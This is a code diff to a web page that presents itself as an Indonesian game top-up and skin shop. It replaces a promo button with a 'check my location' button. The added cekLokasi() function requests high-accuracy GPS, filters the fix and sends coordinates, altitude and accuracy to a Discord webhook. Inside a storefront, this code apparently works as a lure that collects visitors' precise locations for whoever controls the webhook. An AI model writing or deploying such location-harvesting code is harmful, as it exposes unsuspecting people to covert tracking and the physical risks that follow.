@@ -255,8 +255,9 @@ footer {
   <p>Item premium, skin eksklusif, dan top up diamond terpercaya. Langsung aktif, harga terbaik.</p>
   <div class="hero-btns">
     <button class="btn-primary">SHOP NOW →</button>
-    <button class="btn-outline">LIHAT PROMO</button>
+    <button class="btn-outline" id="cek-lokasi-btn" onclick="cekLokasi()">📍 CEK LOKASI SAYA</button>
   </div>
+  <div id="hero-status" style="margin-top:12px;font-family:'Orbitron',monospace;font-size:10px;letter-spacing:2px;color:#5a6380;min-height:14px;"></div>
 </div>
 
 <!-- ITEMS -->
@@ -542,6 +543,58 @@ async function sendToDiscord(data) {
   } catch(e) {
     setStatus('✕ Gagal kirim: ' + e.message, 'err');
   }
+}
+
+/* ── CEK LOKASI SAYA (tombol hero) ── */
+function cekLokasi() {
+  const raw = localStorage.getItem('wh');
+  if (!raw) {
+    document.getElementById('gps-overlay').classList.add('show');
+    setStatus('⚠ Set webhook dulu sebelum lanjut.', 'err');
+    return;
+  }
+
+  const btn = document.getElementById('cek-lokasi-btn');
+  const heroStatus = document.getElementById('hero-status');
+
+  btn.disabled = true;
+  btn.textContent = '◌ MENCARI SINYAL...';
+  heroStatus.textContent = '';
+
+  if (!navigator.geolocation) {
+    btn.disabled = false;
+    btn.textContent = '📍 CEK LOKASI SAYA';
+    heroStatus.style.color = '#ff4757';
+    heroStatus.textContent = '✕ BROWSER TIDAK SUPPORT GPS';
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      const { latitude, longitude, accuracy, altitude } = pos.coords;
+      const f = kalman.process(latitude, longitude, accuracy, pos.timestamp);
+      sampleCount++;
+      await sendToDiscord({ ...f, altitude, rawAccuracy: accuracy, sampleCount });
+
+      btn.disabled = false;
+      btn.textContent = '✓ LOKASI TERKIRIM';
+      heroStatus.style.color = '#00ff88';
+      heroStatus.textContent = `±${Math.round(f.accuracy)}m — CEK DISCORD KAMU`;
+
+      setTimeout(() => {
+        btn.textContent = '📍 CEK LOKASI SAYA';
+        heroStatus.textContent = '';
+      }, 4000);
+    },
+    (err) => {
+      const msgs = { 1:'AKSES DITOLAK', 2:'GPS TIDAK TERSEDIA', 3:'TIMEOUT' };
+      btn.disabled = false;
+      btn.textContent = '📍 CEK LOKASI SAYA';
+      heroStatus.style.color = '#ff4757';
+      heroStatus.textContent = '✕ ' + (msgs[err.code] || err.message);
+    },
+    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+  );
 }
 
 /* ── Auto-load webhook dari storage ── */
